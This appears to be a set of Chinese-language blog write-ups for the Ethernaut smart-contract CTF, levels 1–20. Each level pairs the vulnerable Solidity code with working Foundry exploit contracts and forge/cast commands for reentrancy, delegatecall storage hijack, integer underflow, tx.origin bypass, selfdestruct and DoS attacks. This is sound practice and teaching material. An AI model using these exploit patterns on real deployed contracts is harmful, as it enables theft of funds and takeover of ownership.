[{"title":"Ethernaut 16-20","url":"/2026/02/02/ethernaut3/","content":"Naught Coincontract NaughtCoin is ERC20 &#123;    // string public constant name = &#x27;NaughtCoin&#x27;;    // string public constant symbol = &#x27;0x0&#x27;;    // uint public constant decimals = 18;    uint256 public timeLock = block.timestamp + 10 * 365 days;    uint256 public INITIAL_SUPPLY;    address public player;    constructor(address _player) ERC20(&quot;NaughtCoin&quot;, &quot;0x0&quot;) &#123;        player = _player;        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));        // _totalSupply = INITIAL_SUPPLY;        // _balances[player] = INITIAL_SUPPLY;        _mint(player, INITIAL_SUPPLY);        emit Transfer(address(0), player, INITIAL_SUPPLY);    &#125;    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) &#123;        super.transfer(_to, _value);    &#125;    // Prevent the initial owner from transferring tokens until the timelock has passed    modifier lockTokens() &#123;        if (msg.sender == player) &#123;            require(block.timestamp &gt; timeLock);            _;        &#125; else &#123;            _;        &#125;    &#125;&#125;\n\n\n\n思路在ERC20标准中存在两个转钱的方法，分别是transfer和transferFrom\nfunction transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) &#123;      address spender = _msgSender();      _spendAllowance(from, spender, amount);      _transfer(from, to, amount);      return true;  &#125;\n\n在是使用transferFrom要先使用approve方法，简单来说就是代币拥有者允许某个地址的交易代币的数量。\t\nExpcontract NaughtCoinSolution is Script &#123;    NaughtCoin naughtCoin = NaughtCoin(0xC0Faf18D2b14706353A4a62D752b1Ca4bbe63b5c);    function run() public &#123;        vm.startBroadcast();        NaughtCoinAttack attack = new NaughtCoinAttack(address(naughtCoin));        ERC20(address(naughtCoin)).approve(address(attack), 1000000 * 1e18);        attack.attack();        vm.stopBroadcast();    &#125;&#125;contract NaughtCoinAttack &#123;    address public constant PLAYER = 0x1fec23bf3a1424726dD60b998B9BCf6b3B42b800;    NaughtCoin naughtCoin;    constructor(address _naughtCoin) &#123;        naughtCoin = NaughtCoin(_naughtCoin);    &#125;    function attack() external &#123;        naughtCoin.transferFrom(PLAYER, address(this), 1000000 * 1e18);    &#125;&#125;\n\n\n\nPreservation// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Preservation &#123;    // public library contracts    address public timeZone1Library;    address public timeZone2Library;    address public owner;    uint256 storedTime;    // Sets the function signature for delegatecall    bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) &#123;        timeZone1Library = _timeZone1LibraryAddress;        timeZone2Library = _timeZone2LibraryAddress;        owner = msg.sender;    &#125;    // set the time for timezone 1    function setFirstTime(uint256 _timeStamp) public &#123;        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));    &#125;    // set the time for timezone 2    function setSecondTime(uint256 _timeStamp) public &#123;        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));    &#125;&#125;// Simple library contract to set the timecontract LibraryContract &#123;    // stores a timestamp    uint256 storedTime;    function setTime(uint256 _time) public &#123;        storedTime = _time;    &#125;&#125;\n\n\n\n思路利用delegatecall合约的存储特性,第一步先改变slot中timeZone1Library的值为攻击合约地址.利用攻击合约的函数setTime(uint256)改变代理合约 Preservation的存储变量内容.\nExpcontract PreservationSolution is Script &#123;    Preservation preservation = Preservation(0x215061e387E1FF312cD943967d7c9f74FE9186F8);    function run() public &#123;        vm.startBroadcast();        PreservationAttack attack = new PreservationAttack(address(preservation));        attack.attack();        bytes32 leet0 = vm.load(address(preservation), bytes32(uint256(0)));        bytes32 leet1 = vm.load(address(preservation), bytes32(uint256(1)));        bytes32 leet2 = vm.load(address(preservation), bytes32(uint256(2)));        console.logBytes32(leet0);        console.logBytes32(leet1);        console.logBytes32(leet2);        vm.stopBroadcast();    &#125;&#125;contract PreservationAttack &#123;    address public addressOne;    address public addressTwo;    address public owner;    Preservation preservation;    constructor(address _preservationAddress) &#123;        preservation = Preservation(_preservationAddress);    &#125;    function attack() external &#123;        //第一步改变timeZone1Library为攻击合约地址        preservation.setFirstTime(uint256(uint160(address(this))));        //第二步更改OWNER为自己的合约地址        preservation.setFirstTime(uint256(uint160(address(msg.sender))));    &#125;    function setTime(uint256 _time) public &#123;        owner = address(uint160(_time));    &#125;&#125;\n\n\n\nRecovery// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Recovery &#123;    //generate tokens    function generateToken(string memory _name, uint256 _initialSupply) public &#123;        new SimpleToken(_name, msg.sender, _initialSupply);    &#125;&#125;contract SimpleToken &#123;    string public name;    mapping(address =&gt; uint256) public balances;    // constructor    constructor(string memory _name, address _creator, uint256 _initialSupply) &#123;        name = _name;        balances[_creator] = _initialSupply;    &#125;    // collect ether in return for tokens    receive() external payable &#123;        balances[msg.sender] = msg.value * 10;    &#125;    // allow transfers of tokens    function transfer(address _to, uint256 _amount) public &#123;        require(balances[msg.sender] &gt;= _amount);        balances[msg.sender] = balances[msg.sender] - _amount;        balances[_to] = _amount;    &#125;    // clean up after ourselves    function destroy(address payable _to) public &#123;        selfdestruct(_to);    &#125;&#125;\n\n\n\n思路工厂合约创新的代币合约的时候没有记录代币合约地址，我们需要找到地址并且销毁代币合约转走余额，可以直接在Etherscan寻找，找自己钱包地址交易过的地址就行。\n还有一种从合约地址创建的规律推出来，具体可以看文章涉及RLP编码\nExpinterface IRecovery &#123;    function destroy(address payable _to) external;&#125;contract RecoverySolution is Script &#123;    function run() public &#123;        vm.startBroadcast();        SimpleTokenAttacker attacker = new SimpleTokenAttacker(0x43be930C1C0935f82e4febd2DCf35768d8B6BE03);        attacker.attack();        vm.stopBroadcast();    &#125;&#125;contract SimpleTokenAttacker &#123;    address recoveryAddress;    constructor(address _address) &#123;        recoveryAddress = _address;    &#125;    function attack() external &#123;        IRecovery(recoveryAddress).destroy(payable(msg.sender));    &#125;&#125;\n\n\n\nAlien Codex// SPDX-License-Identifier: MITpragma solidity ^0.5.0;import &quot;../helpers/Ownable-05.sol&quot;;contract AlienCodex is Ownable &#123;    bool public contact;    bytes32[] public codex;    modifier contacted() &#123;        assert(contact);        _;    &#125;    function makeContact() public &#123;        contact = true;    &#125;    function record(bytes32 _content) public contacted &#123;        codex.push(_content);    &#125;    function retract() public contacted &#123;        codex.length--;    &#125;    function revise(uint256 i, bytes32 _content) public contacted &#123;        codex[i] = _content;    &#125;&#125;\n\n\n\n思路因为版本较低，所以说都会出现OvewFlow或者UnderFlow的情况，首先先绕过contacted()呼叫函数makeContact。再使用函数retract()造成UnderFlow的情况。至于如何获得拥有权，合约没有Owner啊?合约继承了Ownable合约如果有继承合约，则被继承合约的 storage variable 会存储在原合约之前，也就是 _owner 变量将存储在 slot 0，接着才按顺序存储 contact、codex。\n下面是最重要的一步，因为codex动态数组出现了UnderFlow所以,数组的长度是2**256,覆盖了整个空间.现在就是通过修改codex[i]来修改slot0的值,具体的推理看下图.\n\nExp必须在unchecked条件下,因为版本高的Solidity会自动防止出现溢出的情况\ninterface IAlienCodex &#123;    function makeContact() external;    function record(bytes32 _content) external;    function retract() external;    function revise(uint256 i, bytes32 _content) external;&#125;contract AlienCodexSolution is Script &#123;    function run() public &#123;        vm.startBroadcast();        AlienAttack attackContract = new AlienAttack(0x96D3dbD3634425BaD084a02fA77eFf21a1Cac4F5);        attackContract.attack();        bytes32 leet0 = vm.load(address(attackContract.alienCodex()), bytes32(uint256(0)));        console.logBytes32(leet0);        vm.stopBroadcast();    &#125;&#125;contract AlienAttack &#123;    IAlienCodex public alienCodex;    constructor(address _alienCodexAddress) &#123;        alienCodex = IAlienCodex(_alienCodexAddress);    &#125;    function attack() external &#123;        alienCodex.makeContact();        alienCodex.retract();        unchecked &#123;            uint256 i = uint256(2) ** uint256(256) - uint256(keccak256(abi.encode(uint256(1))));            alienCodex.revise(i, bytes32(uint256(uint160(msg.sender))));        &#125;    &#125;&#125;\n\n\n\nDenial// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Denial &#123;    address public partner; // withdrawal partner - pay the gas, split the withdraw    address public constant owner = address(0xA9E);    uint256 timeLastWithdrawn;    mapping(address =&gt; uint256) withdrawPartnerBalances; // keep track of partners balances    function setWithdrawPartner(address _partner) public &#123;        partner = _partner;    &#125;    // withdraw 1% to recipient and 1% to owner    function withdraw() public &#123;        uint256 amountToSend = address(this).balance / 100;        // perform a call without checking return        // The recipient can revert, the owner will still get their share        partner.call&#123;value: amountToSend&#125;(&quot;&quot;);        payable(owner).transfer(amountToSend);        // keep track of last withdrawal time        timeLastWithdrawn = block.timestamp;        withdrawPartnerBalances[partner] += amountToSend;    &#125;    // allow deposit of funds    receive() external payable &#123;&#125;    // convenience function    function contractBalance() public view returns (uint256) &#123;        return address(this).balance;    &#125;&#125;\n\n\n\n思路就是简单的Re-entracy造成DOS的漏洞利用。\nExpinterface Idenial {    function withdraw() external;    function setWithdrawPartner(address _partner) external;    function contractBalance() external view returns (uint256);}\ncontract DenialSolution is Script {    function run() public {        vm.startBroadcast();        DenialAttack attackContract &#x3D; new DenialAttack(0x20a7E19aF42B2AAA1Ee5d429B10ABc8c3bcd5746);        attackContract.attack();        vm.stopBroadcast();    }}\ncontract DenialAttack {    Idenial public denial;\nconstructor(address _denialAddress0) {\n    denial = Idenial(_denialAddress0);\n}\n\nfunction attack() external {\n    denial.setWithdrawPartner(address(this));\n}\n\nreceive() external payable {\n    denial.withdraw();\n}\n\n}\n","categories":["CTF-Ethernaut Writeups"],"tags":["Web3 Security","Ethernaut"]},{"title":"Ethernaut 1-10","url":"/2026/01/27/ethernautP1/","content":"资料库\n解构Solidity Contract\n\n合约升级,TPP、UUPS\n\nAlchemy关于Web3的基础\n\nWhat is Smart Contract Storage Layout?\n\n关于Solidity类型转换\n\nETH开发文档\n\n\nFallBack// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Fallback &#123;    mapping(address =&gt; uint256) public contributions;    address public owner;    constructor() &#123;        owner = msg.sender;        contributions[msg.sender] = 1000 * (1 ether);    &#125;    modifier onlyOwner() &#123;        require(msg.sender == owner, &quot;caller is not the owner&quot;);        _;    &#125;    function contribute() public payable &#123;        require(msg.value &lt; 0.001 ether);        contributions[msg.sender] += msg.value;        if (contributions[msg.sender] &gt; contributions[owner]) &#123;            owner = msg.sender;        &#125;    &#125;    function getContribution() public view returns (uint256) &#123;        return contributions[msg.sender];    &#125;    function withdraw() public onlyOwner &#123;        payable(owner).transfer(address(this).balance);    &#125;    receive() external payable &#123;        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);        owner = msg.sender;    &#125;&#125;\n\n\n\n思路\nreceive()和fallback()区别\n\nreceive()\n专门用于接收 ETH 转账\n必须是 external payable\n仅在 msg.data 为空时触发\n\n\nfallback()\n用于处理不存在的函数调用，或者带数据的 ETH 转账\n可以是 payable 或非 payable\n在代理合约中，经常用来转发调用\n\n\n\n\nmsg.data是什么东西\n\n\n\n根据题目第一步需要获得合约的所有权，第二步提款到自己的账号。\n第一步function contribute()和receive(),但是对于条件来说，receive()更加容易实现，只需要转账有余额，并且有contributions映射就可以实现owner = msg.sender;。第二步通过withdraw提款\nExp：contract Ethernaut01Script is Script &#123;    Instance public ethernaut01 = Instance(InstanceAddress);\tfunction run() public &#123;        vm.startBroadcast();        challange.contribute&#123;value: 1 wei&#125;();        //触发Receive()        (bool success,) = payable(challange).call&#123;value: 1 wei&#125;(&quot;&quot;);        require(success, &quot;Transfer failed.&quot;);        challange.withdraw();        vm.stopBroadcast();    &#125;&#125;\n\n\n\n\n\nFallOut// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;contract Fallout &#123;    using SafeMath for uint256;    mapping(address =&gt; uint256) allocations;    address payable public owner;    /* constructor */    function Fal1out() public payable &#123;        owner = msg.sender;        allocations[owner] = msg.value;    &#125;    modifier onlyOwner() &#123;        require(msg.sender == owner, &quot;caller is not the owner&quot;);        _;    &#125;    function allocate() public payable &#123;        allocations[msg.sender] = allocations[msg.sender].add(msg.value);    &#125;    function sendAllocation(address payable allocator) public &#123;        require(allocations[allocator] &gt; 0);        allocator.transfer(allocations[allocator]);    &#125;    function collectAllocations() public onlyOwner &#123;        msg.sender.transfer(address(this).balance);    &#125;    function allocatorBalance(address allocator) public view returns (uint256) &#123;        return allocations[allocator];    &#125;&#125;\n\n\n\n思路目标是获取合约的使用权，在Solidity的0.6版本，构造函数是必须要和合约同名的。但是我们发现合约的构造函数并不是真的，Fal1out其中有一个是数字1而不是字母l，因此我们可以创建接口直接调用Fal1out函数。\nExpFallout public challange = Fallout(InstancetAddress);  function run() public &#123;      vm.startBroadcast();      challange.Fal1out();      vm.stopBroadcast();  &#125;\n\n\n\n\nCoin Filp// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract CoinFlip &#123;    uint256 public consecutiveWins;    uint256 lastHash;    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;    constructor() &#123;        consecutiveWins = 0;    &#125;    function flip(bool _guess) public returns (bool) &#123;        uint256 blockValue = uint256(blockhash(block.number - 1));        if (lastHash == blockValue) &#123;            revert();        &#125;        lastHash = blockValue;        uint256 coinFlip = blockValue / FACTOR;        bool side = coinFlip == 1 ? true : false;        if (side == _guess) &#123;            consecutiveWins++;            return true;        &#125; else &#123;            consecutiveWins = 0;            return false;        &#125;    &#125;&#125;\n\n\n\n思路因为在WEB3中没有真正的随机数，通过代码实现的都可以仿造，在这个例子中只需要仿照合约中的思路得到答案，再把答案给题目合约就可以了\nExp执行十次合约（没错很蠢，也很浪费钱，每次都要广播）每次执行一次都要等一段时间，跳过blockNumber\n\n[!TIP]\n有个更好的方法是直接创建一个Attrack合约在链上，调用攻击方法就可以了\n\nAttract.sol\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &#123;Script, console&#125; from &quot;forge-std/Script.sol&quot;;import &#123;CoinFlip&#125; from &quot;../src/Ethernaut04.sol&quot;;contract Attrack &#123;    CoinFlip private immutable i_coinFilp;    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;    constructor(address _CoinFlip) &#123;        i_coinFilp = CoinFlip(_CoinFlip);    &#125;    function Flip() external &#123;        bool guess = FindGuess();        i_coinFilp.flip(guess);    &#125;    function FindGuess() private view returns (bool) &#123;        uint256 blockValue = uint256(blockhash(block.number - 1));        uint256 coinFlip = blockValue / FACTOR;        bool side = coinFlip == 1 ? true : false;        return side;    &#125;&#125;contract CoinFlipSolution is Script &#123;    CoinFlip public coinflipInstance = CoinFlip(InstanceAddress);    function run() external &#123;        vm.startBroadcast();        Attrack attrack = new Attrack(0x585261CB71C102d4a0AD55AEB0cf71A8235A32f4);        attrack.Flip();        console.log(&quot;consecutiveWins: &quot;, coinflipInstance.consecutiveWins());        vm.stopBroadcast();    &#125;&#125;\n\n\n\n\n\n\n\n\n\nTelephone// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Telephone &#123;    address public owner;    constructor() &#123;        owner = msg.sender;    &#125;    function changeOwner(address _owner) public &#123;        if (tx.origin != msg.sender) &#123;            owner = _owner;        &#125;    &#125;&#125;\n\n\n\n思路关键点是在于区别tx.origin和msg.sender的区别，前者是交易的发起者，后者是合约的调用者\n\n [!NOTE]\nmsg.sender的所有者可以是一个合同。\ntx.origin的所有者永远不会是一个合同。\n在一个简单的调用链A-B-C-D中，D内部的msg.sender将是C，tx.origin将是A。\n\n\n\nExp要注意的一点是要合约Owner是钱包地址才行，函数changeOwner的传入参数是要钱包地址。\ncontract TelephoneSolution is Script &#123;    Telephone public challange = Telephone(InstanceAddress);    function run() external &#123;        console.log(&quot;caller : &quot;, msg.sender);        console.log(&quot;oldOwner&quot;, challange.owner());        vm.startBroadcast();        new TelephoneAttack(challange, vm.envAddress(&quot;MY_ADDRESS&quot;));        vm.stopBroadcast();        console.log(&quot;newOwner&quot;, challange.owner());    &#125;&#125;contract TelephoneAttack &#123;    constructor(Telephone _challengeInstance, address _newOwner) &#123;        _challengeInstance.changeOwner(_newOwner);    &#125;&#125;\n\n\n\n\n\n\n\nToken// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Token &#123;    mapping(address =&gt; uint256) balances;    uint256 public totalSupply;    constructor(uint256 _initialSupply) public &#123;        balances[msg.sender] = totalSupply = _initialSupply;    &#125;    function transfer(address _to, uint256 _value) public returns (bool) &#123;        require(balances[msg.sender] - _value &gt;= 0);        balances[msg.sender] -= _value;        balances[_to] += _value;        return true;    &#125;    function balanceOf(address _owner) public view returns (uint256 balance) &#123;        return balances[_owner];    &#125;&#125;\n\n思路在合约0.6版本，不存在safeMath，可以在加减乘除进行整数的溢出， require(balances[msg.sender] - _value &gt;= 0);其中当msg.sender是零的时候就可以造成整数向下溢出。只需要msg.sender等于0，_to参数是钱包的地址，就可以增加余额。\nExpcontract TokenSolution is Script &#123;    Token public tokenInstance = Token(InstanceAddress);    function run() external &#123;        vm.startBroadcast();        tokenInstance.transfer(address(1), 21);        console.log(&quot;My balance: &quot;, tokenInstance.balanceOf(vm.envAddress(&quot;MY_ADDRESS&quot;)));        vm.stopBroadcast();    &#125;&#125;\n\n直接构造函数填入实例地址即可。\n\n\n[!NOTE]\n首先钱包地址调用了Attrack合约地址中的构造函数，构造函数调用接口就是实例地址。所以对于接口来说msg.sender就是Attrcak合约的地址。Attrack合约是没有余额的，而对于Attrack合约来说，msg.sender是钱包地址。一定要注意好不同的msg.sender的变化。\n\nDelegation// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Delegate &#123;    address public owner;    constructor(address _owner) &#123;        owner = _owner;    &#125;    function pwn() public &#123;        owner = msg.sender;    &#125;&#125;contract Delegation &#123;    address public owner;    Delegate delegate;    constructor(address _delegateAddress) &#123;        delegate = Delegate(_delegateAddress);        owner = msg.sender;    &#125;    fallback() external &#123;        (bool result,) = address(delegate).delegatecall(msg.data);        if (result) &#123;            this;        &#125;    &#125;&#125;\n\n思路首先了解delegatecall函数的特性，使用delegatecall函数还需要注意delegatecall()对状态变量存储的影响，也就是说如果用户A要求更改合约C的某个状态存储变量，合约C不会改变，反而是合约B的对应名字的状态存储变量会发生改变。&#x3D;&#x3D;合约C只是提供行为逻辑，合约B提供逻辑需要的变量&#x3D;&#x3D;\n\n\nExp触发Fallback函数的delegatecall方法\ncontract DelegationSolution is Script &#123;    Delegation delegation = Delegation(InstanceAddress);    function run() external &#123;        bytes memory datas = abi.encodeWithSignature(&quot;pwn()&quot;);        vm.startBroadcast();        console.log(&quot;Owner before: &quot;, delegation.owner());        address(delegation).call(datas);        console.log(&quot;newOwner&quot;, delegation.owner());        vm.stopBroadcast();    &#125;&#125;\n\n\n\n\n\nForce思路利用自毁函数强行转移合约的余额，强制交易余额\n\nExpcontract ForceSolution is Script &#123;    //1.创建一个有钱的合约    //2.销毁第一步创建的合约，强制转账到目标合约    function run() external &#123;        vm.startBroadcast();        new ForceAttack&#123;value: 1 wei&#125;();        vm.stopBroadcast();    &#125;&#125;contract ForceAttack &#123;    constructor() payable &#123;        selfdestruct(payable(InstanceAddress));    &#125;&#125;\n\n\n\n\n\nVault// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Vault &#123;    bool public locked;    bytes32 private password;    constructor(bytes32 _password) &#123;        locked = true;        password = _password;    &#125;    function unlock(bytes32 _password) public &#123;        if (password == _password) &#123;            locked = false;        &#125;    &#125;&#125;\n\n\n\n思路审计之后需要得到构造函数的密码才能过关，但是变量属性是private，不过以太坊本质是区块链，所有都是透明的。所有我们可以查看状态变量知道密码。关于智能合约的StorageLayout可以查看资料库\nExp获取密码的方法：\n\n利用CheatCode\n利用etherScan\n利用cast storage [vault_address] [storage_slot]\n\n//第一步：拿到密码//第二部：调用函数改变lockedcontract VaultSolution is Script &#123;    Vault vault = Vault(0xf4f3Ef631C97B826C9118F489C9CE54171Dfce3c);    function run() public &#123;        vm.startBroadcast();        bytes32 leet = vm.load(address(vault), bytes32(uint256(1)));        vault.unlock(leet);        vm.stopBroadcast();    &#125;&#125;\n\n\n\n\n\n\n\nKing// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract King &#123;    address king;    uint256 public prize;    address public owner;    constructor() payable &#123;        owner = msg.sender;        king = msg.sender;        prize = msg.value;    &#125;    receive() external payable &#123;        require(msg.value &gt;= prize || msg.sender == owner);        payable(king).transfer(msg.value);        king = msg.sender;        prize = msg.value;    &#125;    function _king() public view returns (address) &#123;        return king;    &#125;&#125;\n\n\n\n思路Dos的一种方式。对于合约接受ETH的知识点考察，一般接ETH有两个函数receive和fallback。既没有接收以太币也没有支付回退函数，则合约无法通过常规交易接收以太币并抛出异常。官方文档指出\n\n因为代码使用了transfer的方式发送ETH，所以可以利用这点，当提交实例给关卡时,使得关卡抛出异常，阻止王位的转让,\nExp发送ETH，成为国王，但是不写任何的接受ETH的函数\ncontract KingSolution is Script &#123;    King king = King(payable(InstanceAddress));    function run() public &#123;        vm.startBroadcast();        KingAttack attack = new KingAttack&#123;value: 0.0015 ether&#125;(king);        console.log(&quot;Old King:&quot;, king._king());        attack.beKing();        console.log(&quot;New King:&quot;, king._king());        vm.stopBroadcast();    &#125;&#125;contract KingAttack &#123;    King king;    constructor(King _king) payable &#123;        king = _king;    &#125;    function beKing() external &#123;        (bool success,) = address(king).call&#123;value: 0.001 ether&#125;(&quot;&quot;);        require(success, &quot;CALL FAILED&quot;);    &#125;    receive() external payable &#123;        require(msg.sender == address(this), &quot;no king&quot;);    &#125;&#125;\n\n\n\n\n\nRe-entrancy思路经典的重放攻击，利用recevie或者fallback进行无限套娃。直接把全部的钱取出来\nfunction withdraw(uint _amount) public &#123;    if(balances[msg.sender] &gt;= _amount) &#123; //首先检查sender的余额是否大于要提款的钱        (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;); // msg.sender是接收方的地址，合约利用Call的方式向msg.sender发送_amout数量的钱            if(result) &#123;                _amount;            &#125;        balances[msg.sender] -= _amount;     &#125;&#125;\n\n在以上存在漏洞的函数中，因为使用了Call,如果作为接受ETH的合约存在receive和fallback函数，就会执行这个函数存在的逻辑。当这两个特殊的回调函数再次执行withdraw就会反复取钱\n\nExp// SPDX-License-Identifier: MITpragma solidity ^0.8;interface IReentrancy &#123;    function donate(address) external payable;    function withdraw(uint256) external;&#125;contract Hack &#123;    IReentrancy private immutable target;    constructor() &#123;        target = IReentrancy(0xCa69aB382F26857c5508BAF2aC09F15ccFbD9B25);    &#125;    function attack() external payable &#123;        target.donate&#123;value: 1e15&#125;(address(this));        target.withdraw(1e15);        require(address(target).balance == 0, &quot;target balance &gt; 0&quot;);        selfdestruct(payable(msg.sender));    &#125;    receive() external payable &#123;        uint256 amount = min(1e15, address(target).balance);        if (amount &gt; 0) &#123;            target.withdraw(amount);        &#125;    &#125;    function min(uint256 x, uint256 y) private pure returns (uint256) &#123;        return x &lt;= y ? x : y;    &#125;&#125;\n\n首先部署攻击合约Hack\nforge create src/Attack.sol:Hack --account 0x1f --rpc-url $SEPOLIA_RPC_URL --etherscan-api-key $ETHERSCAN_KEY --broadcast\n\n\n大概的逻辑就是，首先利用Hack合约利用donate函数使得在实例合约中有余额，通过 withdraw()函数的第一层验证。再通过调用实例合约的withdraw()函数实现Re-entrancy attrack。当调用Hack合约中的\ncast send 0xeE911138B13E36DB6E1A2438092A40c0e339D489 &quot;attack&quot; --account 0x1f --rpc-url $SEPOLIA_RPC_URL --value 0.001ether --etherscan-api-key $ETHERSCAN_KEY\n\n为什么是用0.001ETH呢？因为实例地址本身创建之后就存在0.001ETH的余额\n\n可以看到首先Hack合约先发了0.001ETH给予实例合约，然后再触发Re-entrancy\n\n不用部署的Exp\ninterface IReentrance &#123;    function donate(address) external payable;    function withdraw(uint256) external;    function balanceOf(address) external view returns (uint256);&#125;contract ReEntrancySolution is Script &#123;    Reentrance re = Reentrance(0xE1280DB04f7C397BaBd478CA0EFc0f9293eE0927);    function run() public &#123;        vm.startBroadcast();        ReEntrancyAttack attack = new ReEntrancyAttack&#123;value: 0.001 ether&#125;(address(re));        attack.attack();        vm.stopBroadcast();    &#125;&#125;contract ReEntrancyAttack &#123;    IReentrance private immutable target;    constructor(address _instanceAddress) public payable &#123;        target = IReentrance(_instanceAddress);    &#125;    function attack() external &#123;        target.donate&#123;value: 0.001 ether&#125;(address(this));        target.withdraw(0.001 ether);    &#125;    receive() external payable &#123;        uint256 balance = target.balanceOf(address(this));        if (balance &gt; 0) &#123;            target.withdraw(balance);        &#125;    &#125;&#125;\n","categories":["CTF-Ethernaut Writeups"],"tags":["Web3 Security","Ethernaut"]},{"title":"Ethernaut 11-15","url":"/2026/01/29/ethernautP2/","content":"资料库\n解构Solidity Contract\n\n合约升级,TPP、UUPS\n\nAlchemy关于Web3的基础\n\nWhat is Smart Contract Storage Layout?\n\n关于Solidity类型转换\n\nETH开发文档\n\n\nElevator// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface Building &#123;    function isLastFloor(uint256) external returns (bool);&#125;contract Elevator &#123;    bool public top;    uint256 public floor;    function goTo(uint256 _floor) public &#123;        Building building = Building(msg.sender);        if (!building.isLastFloor(_floor)) &#123;            floor = _floor;            top = building.isLastFloor(floor);        &#125;    &#125;&#125;\n\n\n\n思路通关条件是让top为真.\n这一道题目是关于External Call 的安全性，题目对于接口函数building.isLastFloor(uint256)的使用是没有检查的.\n根据代码的理解就是让接口函数第一次返回false第二次返回true.\nExpinterface IBuilding &#123;    function goTo(uint256) external returns (bool);&#125;contract ElevatorSolution is Script &#123;    Elevator elevator = Elevator(InstanceAddress);    function run() public &#123;        vm.startBroadcast();        ElevatorAttack elevatorAttack = new ElevatorAttack(address(elevator));        elevatorAttack.attack();        console.log(&quot;bool top&quot;, elevator.top());        vm.stopBroadcast();    &#125;&#125;contract ElevatorAttack &#123;    Elevator private immutable i_elevator;    uint8 counter = 1;    constructor(address _instanceAddress) public &#123;        i_elevator = Elevator(_instanceAddress);    &#125;    function isLastFloor(uint256 _floor) external returns (bool) &#123;        if (counter &lt; 2) &#123;            counter++;            return false;        &#125; else &#123;            return true;        &#125;    &#125;    function attack() external &#123;        i_elevator.goTo(1);    &#125;&#125;\n\n\n\n\n\nPrivacy// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Privacy &#123;    bool public locked = true;    uint256 public ID = block.timestamp;    uint8 private flattening = 10;    uint8 private denomination = 255;    uint16 private awkwardness = uint16(block.timestamp);    bytes32[3] private data;    constructor(bytes32[3] memory _data) &#123;        data = _data;    &#125;    function unlock(bytes16 _key) public &#123;        require(_key == bytes16(data[2]));        locked = false;    &#125;    /*    A bunch of super advanced solidity algorithms...      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\\      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU    */&#125;\n\n\n\n思路通关要求locked为False\n考察对于Layout of State Variables in Storage，先计算目标key在哪个slot接着就是提取内容，再call函数调用。\nExp\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;forge-std/Script.sol&quot;;import &quot;../src/Privacy.sol&quot;;/** * //  bool：1 byte * // address：20 bytes * // uint256 / int256：32 bytes * // uint8 / int8：1 byte (后缀数字除以 8 依此类推) * // 固定大小的 bytes1 / bytes2 / … / bytes32：大小等同后缀數字 * // 固定陣列 bytes32[3]：每個元素皆 bytes32 (取決数组的元素长度) */contract PrivacySolution is Script &#123;    function run() public &#123;        Privacy privacy = Privacy(InstanceAddress);        vm.startBroadcast();        bytes32 key = vm.load(address(privacy), bytes32(uint256(5)));        console.log(&quot;key&quot;, uint256(key));        address(privacy).call(abi.encodeWithSignature(&quot;unlock(bytes16)&quot;, bytes16(key)));        vm.stopBroadcast();    &#125;&#125;\n\n\n\nGatekeeperOne// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract GatekeeperOne &#123;    address public entrant;    modifier gateOne() &#123;        require(msg.sender != tx.origin);        _;    &#125;    modifier gateTwo() &#123;        require(gasleft() % 8191 == 0);        _;    &#125;    modifier gateThree(bytes8 _gateKey) &#123;        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);        require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);        _;    &#125;    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;        entrant = tx.origin;        return true;    &#125;&#125;\n\n\n\n思路在了解了一定的solidity类型转换的原理后，gateone通过条件很简单只要用合约呼叫就可以通过,gatetwo中存在全局变量gasleft()表示交易中剩余的Gas费用.\n对于gasleft() % 8191 == 0条件只需要在使用call方式触发函数的时候设定确定的Gas接着Fuzz出正确的情况\n具体如下利用For循环\nfor (uint256 i = 0; i &lt; 8191; i++) &#123;            (bool success,) =                address(gatekeeperOne).call&#123;gas: i + 8191 * 